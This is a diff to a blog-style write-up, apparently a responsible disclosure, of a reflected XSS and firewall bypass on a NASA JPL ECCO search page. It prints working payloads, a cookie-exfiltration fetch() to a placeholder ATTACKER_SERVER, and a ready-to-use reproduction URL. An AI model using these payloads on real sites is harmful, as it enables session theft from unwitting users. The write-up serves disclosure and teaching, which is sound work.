@@ -39,7 +39,12 @@ layout: default
     <p>We inserted <code>')</code> immediately after a string of text, which is what JavaScript needed to close <code>console.log()</code>. However, the semicolon symbol <code>;</code> was not being displayed.</p>
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Closing console.log.png" alt="Closing console.log">
 
-    <h2>🧱 Append Javascript (Bypass)</h2>
+    <h2>� Append Javascript (Not Working)</h2>
+    <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');alert(1)</code></pre>
+    <p>We tried again, but with some text after the semicolon. After several tests, we couldn't get the semicolon to appear. Worse still, everything after the semicolon didn't even appear in the text.</p>
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Where is semicollon.png" alt="Where is semicolon">
+
+    <h2>�🧱 Append Javascript (Bypass)</h2>
     <p>To make it work and start injecting code, we had to encode the semicolon in HTML format, changing it from <code>;</code> to <code>%3b</code>.</p>
     <pre><code>pwn')%3balert(1)</code></pre>
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Bypass Semicollon.png" alt="Bypass Semicolon">
@@ -50,7 +55,12 @@ layout: default
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1 HTML.png" alt="Alert 1 HTML">
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1.png" alt="Alert 1">
 
-    <h2>🕵️ Firewall Bypass for Cookies</h2>
+    <h2>� Second Alert (Firewall Blocks)</h2>
+    <p>Once we had managed to execute an <code>alert()</code> on the web page, we wanted to go further and attempt to read a user's cookies. The WAF continued to reject our requests as soon as it detected suspicious strings such as <code>document.cookie</code>.</p>
+    <pre><code>pwn')%3balert(document.cookie)&lt;/script&gt;;//</code></pre>
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Script Tag.png" alt="Blocked by WAF">
+
+    <h2>�🕵️ Firewall Bypass for Cookies</h2>
     <p>The WAF rejected strings like <code>document.cookie</code>. To achieve an effective WAF bypass, we created a variable <code>a</code> that contained <code>document</code>, and we requested <code>cookie</code> from that variable.</p>
     <pre><code>pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//</code></pre>
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Alert.png" alt="Document Cookie Alert">
@@ -61,6 +71,18 @@ layout: default
     <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration.png" alt="Final Exploit">
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration Request.png" alt="Exfiltration Request">
+
+    <h2>✅ Steps To Reproduce</h2>
+    <ol>
+      <li>Start a public web server (we used Serveo exposing a Python localhost server for this).</li>
+      <li>Replace <code>ATTACKER_SERVER</code> with the URL generated for you:
+        <pre><code>pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
+      </li>
+      <li>Visit the URL:
+        <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
+      </li>
+    </ol>
+    <p>You'll receive a request with your <code>cookies</code> appended. You can try with another person to prove it's working.</p>
 
     <h2>📜 Official Recognition</h2>
     <div class="pdf-container">
